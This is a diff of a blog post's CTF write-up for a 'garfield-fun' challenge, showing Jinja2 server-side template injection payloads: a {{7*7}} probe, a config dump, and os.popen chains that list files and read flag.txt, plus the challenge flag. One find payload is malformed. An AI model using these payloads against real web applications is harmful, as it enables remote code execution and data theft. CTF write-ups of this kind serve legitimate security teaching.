@@ -13,6 +13,7 @@ media_subpath: /assets/img/_posts/garfield-ssti
  what is server side template injection? can you use it to get garfields secret?
  
  garfield-fun.challenge.uscctf.org 
+ 
  **Challenge:** garfield-fun  
  **Points:** 100 
  
@@ -91,20 +92,27 @@ media_subpath: /assets/img/_posts/garfield-ssti
  [The challenege website](https://garfield-fun.challenge.uscctf.org)
  ![Garfield Fun](Garfield_00.png)
  ![Garfield Fun1](Garfield_01.png)
-  ```bash
-  Payload:/mylabs?word_5={{7*7}}
-  ```
+  
+    Payload:
+     {% raw %}
+     ```bash
+       /mylabs?word_5={{7*7}}
+      {% endraw %}
  ![SSTI_Confirmed](Garfield_1.png)
-   ```bash
-   Output: Observe the 49 in the image above.
-  ```
+   
+     {% raw %}
+     ```bash
+     Output: Observe the 49 in the image above.
+      {% endraw %}
   This confirms that SSTI exists.
 
  ---
 ### Exploring the Environment
-  ```bash
-    Payload:/mylabs?word_5={{config}}
-  ```
+    Payload:
+     {% raw %}
+     ```bash
+       /mylabs?word_5={{config}}
+      {% endraw %}
  
  ![Config output](Garfield_2.png)
  
@@ -113,17 +121,21 @@ media_subpath: /assets/img/_posts/garfield-ssti
  ---
 
 ### Listing Files
-  ```bash
-    Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen('ls -la').read()}}
-   ``` 
+    Payload:
+    {% raw %}
+     ```bash
+    /mylabs?word_5={{cycler.__init__.__globals__.os.popen('ls -la').read()}}
+     {% endraw %}
  ![ls output](Garfield_3.png)
 
  ---
 
 ### Searching for the Flag
-  ```bash
-    Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen(find.-maxdepth-type).read()}}
-  ```
+    Payload:
+    {% raw %}
+     ```bash
+    /mylabs?word_5={{cycler.__init__.__globals__.os.popen(find.-maxdepth-type).read()}}
+    {% endraw %}
  ![find output](Garfield_4.png)
 
   This revealed the presence of flag.txt.
@@ -131,17 +143,20 @@ media_subpath: /assets/img/_posts/garfield-ssti
  ---
 
 ### Reading the Flag
- ```bash
-    Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}
- ```
+     Payload:
+     {% raw %}
+     ```bash
+       /mylabs?word_5={{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}
+      {% endraw %}
  ![flag output](Garfield_5.png)
 
  ---
 
 ### Flag
-
+    {% raw %}
+     ```bash
     uscctf{ssti_rules_mwahaha}
-
+    {% endraw %}
  ---
 
 ### Why SSTI is Dangerous
